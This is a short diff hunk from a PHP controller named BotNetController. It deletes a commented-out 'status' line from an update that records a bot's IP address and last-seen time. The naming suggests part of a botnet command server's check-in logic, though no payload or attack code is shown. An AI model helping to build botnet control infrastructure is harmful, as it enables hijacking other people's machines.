@@ -149,7 +149,6 @@ class BotNetController extends Controller
         $bot->update([
             'ip_address'                => $request->ip(),
             'last_seen_at'              => now(),
-            // 'status'                    => 'active',
         ]);
 
         return response()->json([
